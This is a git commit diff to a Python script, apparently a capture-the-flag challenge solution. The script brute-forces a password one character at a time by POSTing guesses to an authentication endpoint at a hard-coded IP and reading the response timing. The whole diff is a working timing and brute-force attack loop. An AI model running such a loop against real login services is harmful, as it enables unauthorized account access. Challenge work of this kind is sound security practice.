ed07e42cd32fd6a54be9ed175a08e472cd5d21b4
Denis Astahov <adv4000@gmail.com>
2019-05-11 11:09:55 -0700

    Update brute-post.py

--- Challenge1/brute-post.py
+++ Challenge1/brute-post.py
@@ -11,12 +11,12 @@ import requests
 
 CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|\/?,.<>`~"
 URL    = "http://35.246.158.51:8070/auth/v1_1"
-HEADER = {'User-Agent' : 'ed9ae2c0-9b15-4556-a393-23d500675d4b'}
+HEADERS = {'User-Agent' : 'ed9ae2c0-9b15-4556-a393-23d500675d4b', 'content-type' : 'application/json; charset=utf-8' }
 
 for i in range(len(CHARACTERS)):
-    JSONPAYLOAD = {"Seed": "6711d2ec0d724396ad1570fcfb431443", "Password": CHARACTERS[i]}
-    r = requests.post(url=URL, data=JSONPAYLOAD, headers=HEADER)
+    JSONPAYLOAD = '{"Seed":"6711d2ec0d724396ad1570fcfb431443","Password":"' + CHARACTERS[i] + '"}'
+    r = requests.post(url=URL, data=JSONPAYLOAD, headers=HEADERS)
     result = r.json()
     delay = result['Time']
-    print(CHARACTERS[i] + " - " + str(delay))
+    print(JSONPAYLOAD + " - " + str(delay))
 
